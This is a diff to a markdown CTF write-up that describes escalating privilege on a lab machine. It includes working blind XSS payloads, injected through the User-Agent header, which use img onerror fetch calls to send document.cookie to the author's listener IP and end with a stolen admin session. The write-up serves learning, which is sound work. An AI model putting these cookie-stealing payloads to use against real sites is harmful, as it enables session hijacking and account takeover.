@@ -119,6 +119,8 @@ However this resulted in the same hacking detected attempt message. We could not
 
 One thing we tried was changing the bytes in the cookie to read `admin` instead of `user`, changing the cookie to `ImFkbWluIi64CWZeVO+by/KKGM1o8Nae8F9aZnM=`. We then realized we have no way of knowing if that worked right now but it might be good to hold onto that value for when we run into an admin page. It likely won't be valid since we would assume that the cookie is calculated in a more complex way, but it is worth trying. We then remembered that our [dirsearch](#dirsearch) yielded a route called `/dashboard` with a `401 unauthorized` return status. This means that this page would be what we want to target when we have the admin cookie. However, trying our tampered cookie on this route did not give us access.
 
+#### Elevating Privilege
+
 Back to trying `XSS` attacks, one thing we could try is messing with the headers of the request. The only thing that we were able to recall from natas about vulnerable headers is that sometimes the developers will inherently trust the `User Agent` field of the request and use it in places that it should not. We also recall that it was being used whenever the server was logging a hacking attempt, just as headless seems to be doing here. So our plan of attack for this will be to trigger a hacking attempt and then get the server to possibly log the `User Agent` field which could trigger arbitrary code to fire.
 
 The only issue is that the code will be fired on the server, not on the client. So for us to know if this works we will need to set up a way for us to receive feedback if the code is fired. One way that we can do this is by setting up a server from our own machine and trigger a request to our IP address. We can do this via `python -m http.server 8000`.
@@ -137,6 +139,36 @@ Now we can try and gather more information about the server that we are able to 
 
 `<img src="#" onerror="fetch('http://10.10.14.160:8000?cmd=ls')" />`
 
-This didn't work exactly as we wanted as the response we got back was just `[26/Apr/2024 16:18:20] "GET /?cmd=ls HTTP/1.1" 200 -`. We will need to do some more research on how to get the code to execute the way we want. 
+This didn't work exactly as we wanted as the response we got back was just `[26/Apr/2024 16:18:20] "GET /?cmd=ls HTTP/1.1" 200 -`. We will need to do some more research on how to get the code to execute the way we want. We found this attempt to steal cookies from [this](https://pswalia2u.medium.com/exploiting-xss-stealing-cookies-csrf-2325ec03136e) article, but it did not give us a response.
+
+`<img src="#" onerror="fetch('http://10.10.14.160:8000/?cookie="+btoa(document.cookie)')" />`
+
+We tried this one as well.
+
+`<img src="#" onerror=fetch('http://10.10.14.160:8000/?cookie='document.cookie); />`
+
+But could not get a response either. We then realized that we must have just had a mental lapse and forgot basic JavaScript syntax and then switched the request to include this.
+
+`<img src="#" onerror=fetch('http://10.10.14.160:8000/?cookie='+document.cookie); />`
+
+This gave us the admin cookie!
+
+![admin-cookies](/images/admin-cookies.png)
+
+Pasting that value in to our browser allowed us to access the admin dashboard.
+
+![admin-dash](/images/admin-dash.png)
+
+Hitting the generate report button gave us a nice little message telling us that all systems were up and running. This sends a request that we will now see if we can manipulate to get more information about the server since we have elevated privileges now.
+
+### Stealing Flags
+
+
+
+
+
+
+
+
 
 
